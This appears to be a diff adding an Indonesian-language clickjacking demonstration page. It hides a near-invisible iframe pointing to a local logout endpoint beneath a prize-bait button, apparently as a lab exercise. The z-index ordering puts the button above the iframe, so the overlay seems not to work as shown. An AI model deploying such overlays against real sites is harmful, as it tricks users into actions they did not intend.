@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Clickjacking Attack</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+
+      #bait-button {
+        position: absolute;
+        top: 100px;
+        left: 100px;
+        padding: 20px 50px;
+        background-color: #28a745;
+        color: white;
+        font-size: 18px;
+        border: none;
+        z-index: 2;
+        cursor: pointer;
+      }
+
+      iframe {
+        position: absolute;
+        top: 100px;
+        left: 100px;
+        width: 200px;
+        height: 60px;
+        opacity: 0.01; /* Agar tidak terlihat */
+        z-index: 1;
+        border: none;
+      }
+    </style>
+  </head>
+  <body>
+    <button id="bait-button">🎁 Klik untuk dapat hadiah!</button>
+    <iframe src="http://127.0.0.1:5000/logout" sandbox="allow-scripts allow-forms"></iframe>
+
+    <script>
+      document.getElementById('bait-button').addEventListener('click', function () {
+        alert('🧨 Serangan Clickjacking dilakukan!');
+      });
+    </script>
+  </body>
+</html>
